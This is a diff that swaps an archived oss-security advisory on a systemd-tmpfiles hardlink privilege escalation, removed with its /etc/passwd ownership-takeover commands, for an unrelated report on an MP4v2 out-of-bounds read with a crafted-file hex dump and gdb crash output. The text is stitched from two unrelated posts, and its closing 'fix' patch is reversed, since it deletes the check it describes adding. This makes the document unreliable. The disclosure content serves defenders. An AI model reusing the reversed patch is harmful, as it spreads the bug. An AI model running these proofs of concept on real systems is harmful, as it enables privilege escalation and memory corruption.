@@ -1,104 +1,193 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/29/3
-Message-ID: <efa2af21-aeb9-39a0-bc87-38842e56a9b2@orlitzky.com>
-Date: Mon, 29 Jan 2018 11:06:59 -0500
-From: Michael Orlitzky <michael@...itzky.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/18/3
+Message-ID: <CAB6DpjXN5a0iBNVH6ioDd3RC0moCofxN5-QJWxkWZZswUhncbQ@mail.gmail.com>
+Date: Wed, 18 Jul 2018 16:30:41 +0800
+From: Ruikai Liu <lrk700@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2018-18078: systemd-tmpfiles root privilege escalation with fs.protected_hardlinks=0
+Subject: Out-of-bounds memory access in MP4v2 2.0.0
 Content-Type: text/plain; charset=utf-8
 
-Product: systemd (systemd-tmpfiles)
-Versions-affected: 236 and earlier
-Author: Michael Orlitzky
-Fixed-in: commit 5579f85 , version 237
-Bug-report: https://github.com/systemd/systemd/issues/7736
-Acknowledgments: Lennart Poettering who, instead of calling me an idiot
-  for not realizing that systemd enables fs.protected_hardlinks by
-  default, went out of his way to harden the non-default configuration.
+Hi,
 
+A out-of-bounds memory access bug is found in MP4v2 2.0.0, a legacy
+library dealing with MP4 media file.
 
-== Summary ==
+========= find atom by type =========
 
-Before version 237, the systemd-tmpfiles program will change the
-permissions and ownership of hard links. If the administrator disables
-the fs.protected_hardlinks sysctl, then an attacker can create hard
-links to sensitive files and subvert systemd-tmpfiles, particularly
-with "Z" type entries.
+The function `FindAtom` iterates the atom tree and find the target by
+comparing its type with the given one:
 
-Systemd as PID 1 with the default fs.protected_hardlinks=1 is safe.
+ 316 MP4Atom* MP4Atom::FindChildAtom(const char* name)
+ 317 {
+ 318     uint32_t atomIndex = 0;
+ 319
+ 320     // get the index if we have one, e.g. moov.trak[2].mdia...
+ 321     (void)MP4NameFirstIndex(name, &atomIndex);
+ 322
+ 323     // need to get to the index'th child atom of the right type
+ 324     for (uint32_t i = 0; i < m_pChildAtoms.Size(); i++) {
+ 325         if (MP4NameFirstMatches(m_pChildAtoms[i]->GetType(), name)) {
+ ...
 
+However, the comparison could be passed for an crafted atom which
+doesn't match in fact:
 
-== Details ==
+ 29 bool MP4NameFirstMatches(const char* s1, const char* s2)
+ 30 {
+ 31     if (s1 == NULL || *s1 == '\0' || s2 == NULL || *s2 == '\0') {
+ 32         return false;
+ 33     }
+ 34
+ 35     if (*s2 == '*') {
+ 36         return true;
+ 37     }
+ 38
+ 39     while (*s1 != '\0') {
+ 40         if (*s2 == '\0' || strchr("[.", *s2)) {
+ 41             break;
+ 42         }
+ 43         if (tolower(*s1) != tolower(*s2)) {
+ 44             return false;
+ 45         }
+ 46         s1++;
+ 47         s2++;
+ 48     }
+ 49     return true;
+ 50 }
 
-When running as PID 1, systemd enables the fs.protected_hardlinks
-sysctl by default; that prevents an attacker from creating hard links
-to files that he can't write to. If, however, the administrator should
-decide to disable that sysctl, then hard links may be created to any
-file (on the same filesystem).
+The above while-loop would exit and return true once `s1` ends early.
+For example, `MP4NameFirstMatches("abc\x00", "abcd")` returns true,
+though an atom with type "abc\x00" should never be returned when
+finding atom of type "abcd".
 
-Before version 237, the systemd-tmpfiles program will voluntarily
-change the permissions and ownership of a hard link, and that is
-exploitable in a few scenarios. The most problematic and easiest to
-exploit is the "Z" type tmpfiles.d entry, which changes ownership and
-permissions recursively. For an example, consider the following
-tmpfiles.d entries,
+Things are different when creating atoms. The 4-bytes type read from
+file is strictly checked to determine which atom constructor to
+use(src/mp4atom.cpp):
 
-  d /var/lib/systemd-exploit-recursive 0755 mjo mjo
-  Z /var/lib/systemd-exploit-recursive 0755 mjo mjo
+ 954             if( ATOMID(type) == ATOMID("sdtp") )
+ 955                 return new MP4SdtpAtom(file);
 
-Whenever systemd-tmpfiles is run, those entries make mjo the owner of
-everything under and including /var/lib/systemd-exploit-recursive. After
-the first run, mjo can create a hard link inside that directory pointing
-to /etc/passwd. The next run (after a reboot, for example) changes the
-ownership of /etc/passwd.
+The above difference between creating and finding atoms could result
+in type confusion, which leads to out-of-bounds memory access.
 
-A proof-of-concept can be run from the systemd source tree, using
-either two separate terminals or sudo:
+========= MP4SdtpAtom =========
 
-  root # sysctl -w fs.protected_hardlinks=0
-  root # sysctl -w kernel.grsecurity.linking_restrictions=0
-  root # ./build/systemd-tmpfiles --create
-  mjo $ ln /etc/passwd /var/lib/systemd-exploit-recursive/x
-  root # ./build/systemd-tmpfiles --create
-  mjo $ /bin/ls -l /etc/passwd
-  -rwxr-xr-x 2 mjo mjo 1504 Dec 20 14:27 /etc/passwd
+`FindAtom` is called to find an atom of type "sdtp" when generating
+the track info(src/mp4track.cpp):
 
-More elaborate exploits are possible, and not only the "Z" type is
-vulnerable.
+ 239     // update sdtp log from sdtp atom
+ 240     MP4SdtpAtom* sdtp = (MP4SdtpAtom*)m_trakAtom.FindAtom(
+"trak.mdia.minf.stbl.sdtp" );
+ 241     if( sdtp ) {
+ 242         uint8_t* buffer;
+ 243         uint32_t bufsize;
+ 244         sdtp->data.GetValue( &buffer, &bufsize );
+ 245         m_sdtpLog.assign( (char*)buffer, bufsize );
+ 246         free( buffer );
+ 247     }
 
+So if a crafted MP4 file contains an atom of type "sdt\x00", then this
+atom would be returned and cast to `MP4SdtpAtom`. But its actual class
+is not `MP4SdtpAtom` since strict comparison is used when creating the
+atom. As a result, `sdtp->data` is actually out of the object.
 
-== Resolution ==
+========= POC =========
 
-The recursive change of ownership/permissions does not seem to be safely
-doable without fs.protected_hardlinks enabled.
+We build a MP4 file which contains the necessary fields. The atoms are
+arranged dedicatedly so that for 32-bits program, `sdtp->data` would
+access the trackID, which is controlled by us and would finally leads
+to reading from `0xdeadbeef`:
 
-In version 237 and later, systemd-tmpfiles calls fstatat() immediately
-after obtaining a file descriptor from open():
+root@...ian:~# xxd c4.mp4
+00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
+00000010: 6d70 3432 6973 6f6d 0000 01c4 6d6f 6f76  mp42isom....moov
+00000020: 0000 006c 6d76 6864 0000 0000 3030 3030  ...lmvhd....0000
+00000030: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+00000040: 3030 3030 0000 0000 0000 0000 0000 0000  0000............
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 0000 0000 0000 0150  ...............P
+00000090: 7472 616b 0000 0060 746b 6864 0000 0001  trak...`tkhd....
+000000a0: 1234 5678 2345 6789 dead bed7 0000 0000  .4Vx#Eg.........
+000000b0: 9876 5432 0000 0000 4141 4141 4141 4141  .vT2....AAAAAAAA
+000000c0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000d0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+000000f0: 4141 4141 0000 00e8 6d64 6961 0000 0008  AAAA....mdia....
+00000100: 0565 7374 0000 0020 6864 6c72 4242 4242  .est... hdlrBBBB
+00000110: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB
+00000120: 4242 4242 0000 0020 6d64 6864 0000 0000  BBBB... mdhd....
+00000130: 3030 3030 4040 4040 5050 5050 1010 1010  0000@@@@PPPP....
+00000140: 9090 9090 0000 0098 6d69 6e66 0000 0008  ........minf....
+00000150: 0465 7374 0000 0088 7374 626c 0000 0018  .est....stbl....
+00000160: 7374 737a 0000 0000 0000 0000 0000 0000  stsz............
+00000170: 0000 0000 0000 001c 7374 7363 0000 0000  ........stsc....
+00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000190: 0000 0010 7374 636f 0000 0000 0000 0000  ....stco........
+000001a0: 0000 0018 7374 7473 0000 0000 0000 0000  ....stts........
+000001b0: 0000 0000 0000 0000 0000 001c 1364 7400  .............dt.
+000001c0: 0000 001c 036f 3634 0000 0000 0000 0008  .....o64........
+000001d0: 7374 7368 0000 0008 7364 7400            stsh....sdt.
 
-  fd = open(path, O_NOFOLLOW|O_CLOEXEC|O_PATH);
-  if (fd < 0) {
-    ...
-  }
-  if (fstatat(fd, "", &st, AT_EMPTY_PATH) < 0)
+Here's the result of running `mp4info` on it:
 
-The st->st_nlink field is then checked to determine whether or not fd
-describes a hard link. If it does, the ownership/permissions are not
-changed, and an error is displayed:
+root@...ian:~# gdb /usr/bin/mp4info
+Reading symbols from /usr/bin/mp4info...(no debugging symbols found)...done.
+(gdb) r c4.mp4
+Starting program: /usr/bin/mp4info c4.mp4
+/usr/bin/mp4info version -r
+c4.mp4:
+ReadAtom: "c4.mp4": atom type est is suspect
+ReadAtom: "c4.mp4": atom type est is suspect
+ReadAtom: "c4.mp4": atom type dt is suspect
+ReadAtom: "c4.mp4": atom type sdt is suspect
+ReadChildAtoms: "c4.mp4": In atom stbl missing child atom stsd
+ReadChildAtoms: "c4.mp4": In atom minf missing child atom dinf
 
-  if (hardlink_vulnerable(&st)) {
-    log_error("Refusing to set permissions on hardlink...", path);
-    return -EPERM;
-  }
+Program received signal SIGSEGV, Segmentation fault.
+0xf7ece2c6 in ?? () from /usr/lib/i386-linux-gnu/libmp4v2.so.2
+(gdb) x/i $eip
+=> 0xf7ece2c6:  mov    (%eax),%ecx
+(gdb) i r eax
+eax            0xdeadbeef       -559038737
 
-There is still a tiny window between open() and fstatat() where the
-attacker can fool this countermeasure by removing an existing hard
-link to, say, /etc/passwd. In that case, st->st_nlink will be 1, but
-fd still references /etc/passwd. The attack succeeds, but is much
-harder to do, and the window is as narrow as possible. More to the
-point, it seems unavoidable when implementing the tmpfiles.d
-specification.
+The binary we test is the i386 mp4v2 package of Debian:
 
+root@...ian:~# dpkg -s mp4v2-utils
+Package: mp4v2-utils
+Status: install ok installed
+Priority: optional
+Section: sound
+Installed-Size: 281
+Maintainer: Debian Multimedia Maintainers
+<pkg-multimedia-maintainers@...ts.alioth.debian.org>
+Architecture: i386
+Source: mp4v2 (2.0.0~dfsg0-5)
+Version: 2.0.0~dfsg0-5+b1
+Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.4), libgcc1 (>=
+1:4.2), libstdc++6 (>= 5.2)
 
-== Mitigation ==
+========= fix =========
 
-Leave the fs.protected_hardlinks sysctl enabled.
+The bug can be fixed by more checks when doing type comparison. For example:
+
+--- src/mp4util.cpp     2018-07-18 15:48:12.766709572 +0800
++++ ../mp4v2-2.0.0-orig/src/mp4util.cpp     2012-05-21 06:11:53.000000000 +0800
+@@ -46,7 +46,6 @@
+         s1++;
+         s2++;
+     }
+-    if(*s2 != '[' && *s2 != '.' && *s2 != '\0') return false;
+     return true;
+ }
+
+========= Reference =========
+
+[1] https://code.google.com/archive/p/mp4v2/
+[2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt
+
+-- 
+Best regards,
+
+Ruikai Liu
